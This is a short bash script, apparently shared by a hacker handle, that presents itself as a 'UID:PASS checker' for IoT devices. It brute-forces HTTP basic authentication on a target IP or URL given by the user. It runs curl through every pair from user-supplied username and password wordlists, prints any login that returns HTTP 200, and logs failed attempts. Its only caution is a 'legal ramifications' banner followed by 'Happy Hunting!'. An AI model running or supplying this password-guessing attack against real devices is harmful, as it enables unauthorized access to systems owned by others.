
                   ######Simple UID:PASS checker for IoT Devices######
                       #####Brought to you by .0. sudo_KING#####

#!/bin/bash

BLACK='\e[0;30m'
BLUE='\e[0;34m'
GREEN='\e[0;32m'
CYAN='\e[0;36m'
RED='\e[0;31m'
PURPLE='\e[0;35m'
BROWN='\e[0;33m'
LIGHTGRAY='\e[0;37m'
DARKGRAY='\e[1;30m'
LIGHTBLUE='\e[1;34m'
LIGHTGREEN='\e[1;32m'
LIGHTCYAN='\e[1;36m'
LIGHTRED='\e[1;31m'
LIGHTPURPLE='\e[1;35m'
YELLOW='\e[1;33m'
WHITE='\e[1;37m'
NC='\e[0m'              # No Color

echo -e ""
echo -e $RED "                        This Tool Can Lead to Legal Ramifications "
echo -e $YELLOW  "                             USE AT YOUR OWN RISK!            "
echo -e $GREEN  "                                 by: sudo_KING .0.             "
echo -e $BLUE "                                   Happy Hunting!                " $NC
echo -e ""

sleep 2

read -p " Input Target IP or URL and Hit Enter: " ADDRESS

url=$ADDRESS
for user in $(cat <path to user wordlist>); do 
  for pass in $(cat <path to pwd wordlist>); do
    http_code=$(curl -v -L -u "$user":"$pass" "$url" -w '%{http_code}' -o /dev/null -s)
    if [[ $http_code -eq 200 ]]; then
      echo "Success: Address:'$ADDRESS' User:'$user' Pass:'$pass'"
      break
else echo  "Failed: "$user" and "$pass" on "$ADDRESS"" >> <location to save outfile and desired file name>
    fi
  done
done

#EOF
